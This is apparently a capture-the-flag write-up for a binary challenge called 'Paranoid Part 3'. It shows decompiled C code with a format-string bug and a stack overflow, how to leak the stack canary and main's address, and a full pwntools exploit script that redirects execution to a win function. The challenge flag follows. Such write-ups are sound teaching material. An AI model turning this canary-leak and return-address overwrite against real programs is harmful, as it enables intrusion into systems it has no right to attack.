+++
title = "Paranoid Part 3"
date = 2024-07-04
authors = ["Abhinav I S"]
+++

First, we run checksec
<br>
{{ img(id="image1.png", alt="Alt Text", class="textCenter") }}

<br>

```c
void main(void)

{
  long in_FS_OFFSET;
  char local_68 [48];
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  banner();
  puts("\nOkay Its getting serious now. Somehow I now suck at hiding my actual address.");
  puts("\nHence, I\'ve now decided to keep one of the strongest security guard on watch");
  puts("\nHe will make sure that no one gets in and collects any evidence against me");
  puts("\nHe\'s no ordinary guard I tell ya...The FBI fear him!");
  printf("\nCan you guess who he is?: ");
  fflush(stdout);
  read(0,local_68,0x23);
  printf("\nReally? you couldn\'t think of anyone better than ");
  printf(local_68);
  printf(
        "\nTill we meet again then my old friend...Give me your final message. You will likely not s ee me now for a long time: "
        );
  fflush(stdout);
  read(0,local_38,0x120);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

looking at the other functions, there is a safe_house function which we need to return to. The difference from paranoid part 2 is the existence of [a stack canary](https://ctf101.org/binary-exploitation/stack-canaries/)

opening the binary in GDB, examining addresses of RBP, and the value that gets printed from the stack, we can calculate the offset to the canary, and the address of main

1. give input %7$lx, the value that gets printed out is 0
2. examine stack and value of rbp

<br>
{{ img(id="image2.png", alt="Alt Text", class="textCenter") }}

3. clearly the canary is at %17$lx and the address of main is at %21$lx

Now, we can write the solve script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rvcechalls.xyz", 33545)

    return r


def main():
    r = conn()  
    r.recv()
    r.sendline(b"%17$lx.%21$lx")
    data = r.recvuntil(b"better than ")
    data = r.recv()
    addresses = data.split(b"\n")[0]

    canary = addresses.split(b".")[0]
    main = addresses.split(b".")[1]

    # r.recv()
    win = int(main,16) - 211
    payload = b"A"*0x28 + p64(int(canary,16 ))+ b"B"*8 + p64(win)
    r.sendline(payload)
    r.recv()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

gives us the flag 
<br>

```
flag{Th15_pUnY_6u4rd_aint_S70pp1n_m33_1907ebe25bf}
```
